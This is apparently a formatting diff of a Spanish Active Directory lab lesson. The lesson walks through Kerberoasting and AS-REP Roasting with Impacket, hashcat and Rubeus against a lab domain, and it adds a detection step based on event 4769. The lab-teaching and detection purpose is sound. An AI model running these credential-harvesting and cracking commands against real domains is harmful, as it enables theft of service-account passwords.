@@ -53,19 +53,25 @@ Al finalizar, el alumno podrá:
 
 1. **Repaso del flujo.** Dibuja AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP y marca dónde entra material crackeable.
 2. **Kerberoasting con Impacket:**
+
    ```bash
    GetUserSPNs.py lab.local/lowuser:Passw0rd -dc-ip 10.10.10.10 -request -outputfile roast.txt
    ```
+
 3. **Crackea offline:**
+
    ```bash
    hashcat -m 13100 roast.txt /usr/share/wordlists/rockyou.txt
    ```
+
    Recupera la contraseña de la cuenta de servicio.
 4. **AS-REP Roasting:**
+
    ```bash
    GetNPUsers.py lab.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass -format hashcat
    hashcat -m 18200 asrep.txt rockyou.txt
    ```
+
 5. **Con Rubeus (Windows):** `Rubeus.exe kerberoast /outfile:roast.txt` y compara el flujo con Impacket.
 6. **Fuerza RC4 y compara.** Solicita el TGS con etype RC4 y observa cuánto más rápido cracker frente a AES.
 7. **Detección.** Revisa en el DC los eventos `4769` (TGS solicitado) con etype 0x17 (RC4) y documenta cómo el Blue Team los usa para alertar.
@@ -107,10 +113,10 @@ Contraseñas largas y aleatorias para cuentas de servicio, uso de gMSA/dMSA, des
 
 ## 🔗 Referencias
 
-- The Hacker Recipes — *Kerberoasting / AS-REP Roasting*. https://www.thehacker.recipes/ad/movement/kerberos
-- MITRE ATT&CK — *Steal or Forge Kerberos Tickets* (`T1558`). https://attack.mitre.org/techniques/T1558/
-- Rubeus. https://github.com/GhostPack/Rubeus
-- Hashcat modes. https://hashcat.net/wiki/doku.php?id=example_hashes
+- The Hacker Recipes — *Kerberoasting / AS-REP Roasting*. <https://www.thehacker.recipes/ad/movement/kerberos>
+- MITRE ATT&CK — *Steal or Forge Kerberos Tickets* (`T1558`). <https://attack.mitre.org/techniques/T1558/>
+- Rubeus. <https://github.com/GhostPack/Rubeus>
+- Hashcat modes. <https://hashcat.net/wiki/doku.php?id=example_hashes>
 
 ## ➡️ Siguiente clase
 
